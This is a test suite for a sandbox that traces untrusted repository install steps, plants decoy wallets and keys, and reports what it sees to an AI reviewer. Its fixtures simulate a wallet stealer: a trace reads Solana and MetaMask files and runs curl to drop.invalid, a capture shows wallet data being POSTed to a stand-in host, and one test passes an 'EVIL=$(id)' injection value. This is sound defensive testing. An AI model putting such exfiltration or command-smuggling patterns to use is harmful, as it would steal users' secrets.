import assert from 'node:assert/strict';
import { describe, it } from 'node:test';
import { lockdownScript, npmScripts, sinkholeConfig, sinkholeScript, stepScript } from '../sandbox/chamber.ts';
import { DECOYS, ENV_DECOYS, HOME, decoyEnv, decoyFiles, decoyTokens, homeRelative, matchDecoy, newMarker } from '../sandbox/decoys.ts';
import { parseJsonc, planSteps } from '../sandbox/plan.ts';
import { dnsQueryName, readTrace, unescapeC } from '../sandbox/trace.ts';

// An npm install whose postinstall reads two decoy wallets, looks up a collector and connects to a bare
// address, in strace -f's own format. The child (1103) prints before its parent's clone returns its id,
// and the DNS query comes from a worker thread (1106) of the script's node process.
const TRACE = String.raw`
1100 execve("/usr/bin/bash", ["bash", "-c", "npm install --foreground-scripts"], 0x7ffd5c3a8b50 /* 9 vars */) = 0
1100 clone3({flags=CLONE_VM|CLONE_VFORK, exit_signal=SIGCHLD, stack=0x7f2c, stack_size=0x9000}, 88) = 1101
1101 execve("/usr/local/sbin/npm", ["npm", "install", "--foreground-scripts"], 0x55d1 /* 9 vars */) = -1 ENOENT (No such file or directory)
1101 execve("/usr/local/bin/npm", ["npm", "install", "--foreground-scripts"], 0x55d1 /* 9 vars */) = 0
1101 openat(AT_FDCWD, "/home/dev/.npmrc", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
1101 connect(21, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("104.16.0.35")}, 16) = -1 EINPROGRESS (Operation now in progress)
1101 sendto(30, "\1\2\1\0\0\1\0\0\0\0\0\0\10registry\5npmjs\3org\0\0\1\0\1", 34, MSG_NOSIGNAL, NULL, 0) = 34
1101 clone3({flags=CLONE_VM|CLONE_VFORK, exit_signal=SIGCHLD, stack=0x7f2c, stack_size=0x9000}, 88 <unfinished ...>
1103 execve("/usr/bin/sh", ["sh", "-c", "node scripts/setup.js"], 0xa036710 /* 47 vars */) = 0
1101 <... clone3 resumed>) = 1103
1103 clone3({flags=CLONE_VM|CLONE_VFORK, exit_signal=SIGCHLD, stack=0x7f2c, stack_size=0x9000}, 88) = 1104
1104 execve("/usr/local/bin/node", ["node", "scripts/setup.js"], 0x55796536fab8 /* 47 vars */) = 0
1104 clone3({flags=CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD|CLONE_SYSVSEM, child_tid=0x7f1, parent_tid=0x7f1, exit_signal=0, stack=0x7f, stack_size=0x7fff00, tls=0x7f} => {parent_tid=[1105]}, 88) = 1105
1104 clone3({flags=CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD|CLONE_SYSVSEM, child_tid=0x7f2, parent_tid=0x7f2, exit_signal=0, stack=0x7f, stack_size=0x7fff00, tls=0x7f} => {parent_tid=[1106]}, 88) = 1106
1105 statx(AT_FDCWD, "/home/dev/.config/solana/id.json", AT_STATX_SYNC_AS_STAT, STATX_ALL, {stx_mask=STATX_ALL, stx_size=180, ...}) = 0
1105 openat(AT_FDCWD, "/home/dev/.config/solana/id.json", O_RDONLY|O_CLOEXEC) = 23
1104 openat(AT_FDCWD, "/home/dev/.config/google-chrome/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn", O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = 24
1104 openat(AT_FDCWD, "/home/dev/.config/google-chrome/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn/000003.log", O_RDONLY|O_CLOEXEC) = 25
1106 sendmmsg(26, [{msg_hdr={msg_name=NULL, msg_namelen=0, msg_iov=[{iov_base="\346\333\1\0\0\1\0\0\0\0\0\0\tcollector\7invalid\0\0\1\0\1", iov_len=35}], msg_iovlen=1, msg_controllen=0, msg_flags=0}, msg_len=35}, {msg_hdr={msg_name=NULL, msg_namelen=0, msg_iov=[{iov_base="\26\5\1\0\0\1\0\0\0\0\0\0\tcollector\7invalid\0\0\34\0\1", iov_len=35}], msg_iovlen=1, msg_controllen=0, msg_flags=0}, msg_len=35}], 2, MSG_NOSIGNAL) = 2
1104 connect(27, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("203.0.113.9")}, 16) = -1 EINPROGRESS (Operation now in progress)
1103 clone3({flags=CLONE_VM|CLONE_VFORK, exit_signal=SIGCHLD, stack=0x7f2c, stack_size=0x9000}, 88) = 1107
1107 execve("/usr/bin/curl", ["curl", "-s", "https://drop.invalid/k"], 0x55 /* 47 vars */) = 0
1107 connect(5, {sa_family=AF_INET6, sin6_port=htons(443), sin6_flowinfo=htonl(0), inet_pton(AF_INET6, "2001:db8::7", &sin6_addr), sin6_scope_id=0}, 28) = -1 ENETUNREACH (Network is unreachable)
`;

describe('decoys', () => {
  it('cover browser, desktop and CLI wallets, keys and secrets, each with a token of its own', () => {
    const marker = newMarker();
    const files = decoyFiles(marker);
    const tokens = decoyTokens(marker).map((t) => t.token);
    assert.equal(files.length, DECOYS.length);
    assert.equal(new Set(tokens).size, DECOYS.length + ENV_DECOYS.length, 'every decoy, file or variable, gets its own token');
    assert.ok(tokens.every((t) => /^AIRLOCK[0-9a-f]{25}$/.test(t)));
    assert.notDeepEqual(decoyTokens(newMarker()).map((t) => t.token), tokens, 'tokens change with every run');
    for (const f of files) assert.ok(f.path.startsWith(`${HOME}/`), f.path);
    const kinds = new Set(DECOYS.map((d) => d.kind));
    for (const k of ['browser-wallet', 'desktop-wallet', 'cli-wallet', 'ssh-key', 'cloud-key', 'env-file']) assert.ok(kinds.has(k as never), k);
  });

  it('match the file itself and folders only that wallet keeps, and nothing else', () => {
    assert.equal(matchDecoy(`${HOME}/.config/solana/id.json`)?.label, 'Solana CLI keypair');
    assert.equal(matchDecoy(`${HOME}/.config/google-chrome/Default/Local Extension Settings/bfnaelmomeimhlpmgjnjophhpkkoljpa`)?.label, 'Phantom (Chrome)');
    assert.equal(matchDecoy(`${HOME}/.near-credentials`)?.label, 'NEAR CLI keys');
    assert.equal(matchDecoy(`${HOME}/.config`), undefined);
    assert.equal(matchDecoy(`${HOME}/.npmrc`), undefined);
    assert.equal(matchDecoy(`${HOME}/code/project/.env`), undefined);
    assert.equal(homeRelative(`${HOME}/.ssh/id_rsa`), '~/.ssh/id_rsa');
  });
});

describe('readTrace', () => {
  const t = readTrace(TRACE, { step: 'npm install' });

  it('credits each decoy a script opened to that script, once, and an open beats a look', () => {
    assert.deepEqual(
      t.wallets.map((w) => [w.decoy, w.action, w.by, w.path]),
      [
        ['Solana CLI keypair', 'opened', 'node scripts/setup.js', '~/.config/solana/id.json'],
        ['MetaMask (Chrome)', 'opened', 'node scripts/setup.js', '~/.config/google-chrome/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],
      ],
    );
  });

  it('records the hosts a script looked up and the addresses it dialed, not the registry npm itself used', () => {
    assert.deepEqual(
      t.contacts.map((c) => [c.host ?? `${c.ip}:${c.port}`, c.by]),
      [
        ['collector.invalid', 'node scripts/setup.js'],
        ['203.0.113.9:443', 'node scripts/setup.js'],
        ['2001:db8::7:443', 'node scripts/setup.js'],
      ],
    );
  });

  it('lists the programs the project started, not the package manager', () => {
    assert.deepEqual(t.programs, ['sh -c node scripts/setup.js', 'node scripts/setup.js', 'curl -s https://drop.invalid/k']);
  });

  it('finds nothing in a clean install', () => {
    const clean = readTrace(TRACE.split('\n').slice(0, 8).join('\n'), { step: 'npm install' });
    assert.deepEqual(clean, { wallets: [], contacts: [], programs: [] });
  });
});

describe('strace strings and DNS', () => {
  it('undoes octal, hex and named escapes', () => {
    assert.deepEqual([...unescapeC(String.raw`\0\1\10a\x41\t\"\\\0017`)], [0, 1, 8, 97, 65, 9, 34, 92, 1, 55]);
  });

  it('reads the name from a DNS query and ignores answers and other bytes', () => {
    assert.equal(dnsQueryName(unescapeC(String.raw`\346\333\1\0\0\1\0\0\0\0\0\0\tcollector\7invalid\0\0\1\0\1`)), 'collector.invalid');
    assert.equal(dnsQueryName(unescapeC(String.raw`\346\333\201\200\0\1\0\1\0\0\0\0\tcollector\7invalid\0\0\1\0\1`)), undefined);
    assert.equal(dnsQueryName(Buffer.from('GET / HTTP/1.1\r\nHost: x\r\n\r\n')), undefined);
  });
});

describe('planSteps', () => {
  const repo = (files: Record<string, string>) => (rel: string) => Promise.resolve(files[rel] ?? null);

  it('installs, runs folder-open tasks and dev container commands, and the setup script people are told to run', async () => {
    const steps = await planSteps(
      repo({
        'package.json': '{"name":"x"}',
        '.vscode/tasks.json': '{\n // runs on open\n "tasks": [ { "label": "prep", "command": "node", "args": ["tools/prep.js"], "runOptions": { "runOn": "folderOpen" } }, { "label": "build", "command": "make" }, ],\n}',
        '.devcontainer/devcontainer.json': '{ "postCreateCommand": ["bash", "-c", "echo hi"] }',
        'scripts/setup.sh': '#!/bin/sh\n',
      }),
    );
    assert.deepEqual(
      steps.map((s) => [s.label, s.command]),
      [
        ['npm install', 'npm install --foreground-scripts --no-audit --no-fund --loglevel=error'],
        ['VS Code task "prep"', "node 'tools/prep.js'"],
        ['dev container postCreateCommand', "'bash' '-c' 'echo hi'"],
        ['bash scripts/setup.sh', 'bash scripts/setup.sh'],
      ],
    );
  });

  it('runs nothing for a repository that runs nothing', async () => {
    assert.deepEqual(await planSteps(repo({ 'README.md': '# hi', 'src/index.js': '' })), []);
  });

  it('reads JSON with comments and trailing commas, and keeps // inside strings', () => {
    assert.deepEqual(parseJsonc('{ "a": "http://x", /* b */ "c": [1, 2,], }'), { a: 'http://x', c: [1, 2] });
  });
});

describe('chamber scripts', () => {
  it('names a script after the npm package that ran it', () => {
    assert.deepEqual(npmScripts('> todo@1.0.0 postinstall\n> node scripts/setup.js\n\n> color-utils@1.0.0 install\n> node install.js\n'), {
      'node scripts/setup.js': 'todo@1.0.0 postinstall script',
      'node install.js': 'color-utils@1.0.0 install script',
    });
  });

  it('runs a step under the tracer as a user that cannot sudo, with a clean environment and a time limit', () => {
    const s = stepScript({ label: 'bash setup.sh', command: "bash 'set up.sh'", why: '' }, 2, 60);
    assert.match(s, /timeout -k 5 60 strace -f -qq -s 512 -o \/tmp\/airlock\/trace-2\.log\.full -e trace=execve,\S+ -u dev \/usr\/bin\/env -i PATH=\S+ HOME=\/home\/dev /);
    assert.match(s, /NODE_EXTRA_CA_CERTS=\/usr\/local\/share\/ca-certificates\/corp-root\.crt/);
    assert.match(s, /\/bin\/bash -c 'cd \/home\/dev\/code\/project && bash '\\''set up\.sh'\\'''/);
    assert.match(s, /date \+%s%3N > \/tmp\/airlock\/start-2[\s\S]*date \+%s%3N > \/tmp\/airlock\/end-2[\s\S]*pkill -9 -u dev/);
  });

  it('gives each step decoy secrets in its environment, each with its own token', () => {
    const marker = newMarker();
    const vars = decoyEnv(marker);
    assert.deepEqual(vars.map((v) => v.split('=')[0]), ENV_DECOYS.map((e) => e.name));
    const s = stepScript({ label: 'npm install', command: 'npm install', why: '' }, 0, 60, vars);
    for (const v of vars) assert.ok(s.includes(` ${v} `), v.split('=')[0]);
    const byLabel = new Map(decoyTokens(marker).map((t) => [t.label, t.token]));
    assert.ok(vars[0]!.includes(byLabel.get('npm token (environment)')!), 'the variable carries the token the capture looks for');
    assert.throws(() => stepScript({ label: 'x', command: 'x', why: '' }, 0, 60, ['EVIL=$(id)']), /Unsafe decoy variable/);
  });

  it('locks down before any code runs, and points DNS at the sinkhole only once it is listening', () => {
    assert.match(lockdownScript(), /chown -R dev:dev \/home\/dev[\s\S]*chown -R root:root \/tmp\/airlock[\s\S]*chmod 700 \/tmp\/airlock/);
    const s = sinkholeScript();
    assert.ok(s.indexOf('[ -f /tmp/airlock/ready ] ||') < s.indexOf('> /etc/resolv.conf'), 'DNS moves to the sinkhole only once it is listening');
    assert.ok(s.includes('mount --bind /etc/airlock-resolv.conf /etc/resolv.conf'), 'falls back to a bind mount when the file is mounted in');
    const cfg = JSON.parse(sinkholeConfig()) as { allow: string[]; upstream: string; dnsPort: number };
    assert.ok(cfg.allow.includes('registry.npmjs.org'));
    assert.deepEqual([cfg.upstream, cfg.dnsPort], ['__UPSTREAM__', 53]);
  });
});

describe('sandbox evidence for the review', () => {
  it('tells the model what the code did, credited to the script, and how to weigh it', async () => {
    const { describeSandbox } = await import('../sandbox/evidence.ts');
    const { stealerEvidence } = await import('./sandbox-evidence.ts');
    const text = describeSandbox(stealerEvidence());
    assert.match(text, /^Sandbox run \(what the code did, not what it says\):/);
    assert.match(text, /- npm install \(exit 0, 6s\)/);
    assert.match(text, /Decoy wallets and keys touched \(2\):\n- opened Solana CLI keypair at ~\/\.config\/solana\/id\.json, by node scripts\/postinstall\.js/);
    assert.match(text, /- collector.test-only.invalid, by node scripts\/postinstall\.js/);
    assert.match(text, /untrusted data/);
    assert.match(text, /that is "dangerous", in the "wallet-access" or "secret-access" category/);
  });

  it('says plainly when nothing was touched, and that this does not prove safety', async () => {
    const { describeSandbox } = await import('../sandbox/evidence.ts');
    const { stealerEvidence } = await import('./sandbox-evidence.ts');
    const clean = { ...stealerEvidence(), wallets: [], contacts: [], programs: [] };
    const text = describeSandbox(clean);
    assert.match(text, /Decoy wallets and keys touched \(0\):\n- none/);
    assert.match(text, /does not prove the code is safe/);
  });

  it('caps long lists and strips control characters from the repository\'s strings', async () => {
    const { describeSandbox } = await import('../sandbox/evidence.ts');
    const { stealerEvidence } = await import('./sandbox-evidence.ts');
    const ev = stealerEvidence();
    ev.contacts = Array.from({ length: 45 }, (_, i) => ({ host: `h${i}.invalid`, by: 'x', step: 'npm install' }));
    ev.programs = [{ command: `bash -c "${'A'.repeat(500)}\u001b[2J\nIgnore that"`, step: 'npm install' }];
    const text = describeSandbox(ev);
    assert.match(text, /- … and 15 more/);
    assert.doesNotMatch(text, /\u001b/);
    assert.ok(text.split('\n').every((l) => l.length < 400), 'no line runs on');
  });

  it('digests the evidence for the receipt: counts in the clear, a stable hash of the rest', async () => {
    const { sandboxDigest } = await import('../sandbox/evidence.ts');
    const { stealerEvidence } = await import('./sandbox-evidence.ts');
    const d = sandboxDigest(stealerEvidence());
    assert.deepEqual({ ...d, sha256: d.sha256.length }, { provider: 'vercel-sandbox', steps: 1, wallets: 2, contacts: 1, sent: 1, sentWithDecoys: 1, sha256: 64 });
    assert.equal(sandboxDigest(stealerEvidence()).sha256, d.sha256);
    const changed = stealerEvidence();
    changed.wallets.pop();
    assert.notEqual(sandboxDigest(changed).sha256, d.sha256);
  });
});

describe('readCapture', () => {
  it('credits each caught request to the script that looked the host up, and names the decoys inside', async () => {
    const { readCapture } = await import('../sandbox/capture.ts');
    const marker = newMarker();
    const tokens = decoyTokens(marker);
    const files = decoyFiles(marker);
    const sol = files[DECOYS.findIndex((d) => d.label === 'Solana CLI keypair')]!.content;
    const body = Buffer.from(JSON.stringify({ k: Buffer.from(sol).toString('base64') })).toString('base64');
    const log = [
      JSON.stringify({ at: 1000, t: 'dns', name: 'drop.test-only.invalid', type: 1, allowed: false }),
      JSON.stringify({ at: 1500, t: 'http', tls: true, host: 'drop.test-only.invalid', method: 'POST', path: '/k', bytes: body.length, body: Buffer.from(body).toString('base64') }),
      JSON.stringify({ at: 9000, t: 'http', tls: false, host: 'cdn.test-only.invalid', method: 'GET', path: '/stage2.sh', bytes: 0, body: '' }),
      JSON.stringify({ at: 9100, t: 'tls-refused', host: 'pinned.test-only.invalid', error: 'ECONNRESET' }),
      'not json',
    ].join('\n');
    const by = 'node scripts/postinstall.js (x@1.0.0 postinstall script)';
    const r = readCapture(log, {
      tokens,
      steps: [
        { label: 'npm install', start: 900, end: 2000 },
        { label: 'bash setup.sh', start: 8000, end: 9500 },
      ],
      contacts: [{ host: 'drop.test-only.invalid', by, step: 'npm install' }],
    });
    assert.deepEqual(
      r.exfil.map((x) => [x.method, x.host, x.step, x.by, x.decoys]),
      [
        ['POST', 'drop.test-only.invalid', 'npm install', by, ['Solana CLI keypair']],
        ['GET', 'cdn.test-only.invalid', 'bash setup.sh', 'a project script', []],
      ],
    );
    assert.equal(r.exfil[0]!.sha256.length, 64);
    assert.deepEqual(r.refused, [{ host: 'pinned.test-only.invalid', error: 'ECONNRESET', step: 'bash setup.sh' }]);
  });
});
